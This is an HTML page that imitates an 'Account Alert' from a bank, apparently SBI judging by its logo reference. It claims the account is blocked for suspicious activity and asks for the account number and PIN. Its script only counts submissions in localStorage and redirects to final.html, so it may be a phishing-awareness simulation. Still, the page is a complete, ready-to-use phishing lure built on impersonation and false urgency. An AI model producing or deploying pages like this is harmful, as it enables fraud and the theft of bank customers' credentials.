<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bank Account Alert</title>
    <style>
        body {
            font-family: Arial;
            background: white;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background: white;
            width: 350px;
            padding: 25px;
            box-shadow: 0 0 10px rgba(0,0,0,0.2);
            border-radius: 10px;
            text-align: center;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
        .pass {
            color: rgb(67, 67, 189);
            font-size: 14px;
            text-align: end;
            margin-top: -5px;
            cursor: pointer;
        }
        button {
            background: #0054a6;
            color: white;
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }
    </style>
</head>

<body>

<div class="container">
    <img src="SBI logo.png" width="160">

    <h1>âš  Account Alert</h1>
    <p style="color:red; font-weight:bold;">
        Your bank account has been temporarily blocked due to suspicious activity.
    </p>

    <p>Please verify your details to restore access.</p>

    <input id="account" type="text" placeholder="Account Number">
    <input id="pin" type="password" placeholder="Enter PIN">

    <h3 class="pass">Forgot PIN ?</h3>

    <button onclick="verifyUser()">Verify Now</button>
</div>

<script>
function verifyUser() {
    let account = document.getElementById("account").value;
    let pin = document.getElementById("pin").value;

    if (account.trim() === "" || pin.trim() === "") {
        alert("Please enter Account Number and PIN");
        return;
    }

    let attempts = localStorage.getItem("dataAttempts");
    attempts = attempts ? parseInt(attempts) + 1 : 1;
    localStorage.setItem("dataAttempts", attempts);

    window.location.href = "final.html";
}
</script>

</body>
</html>
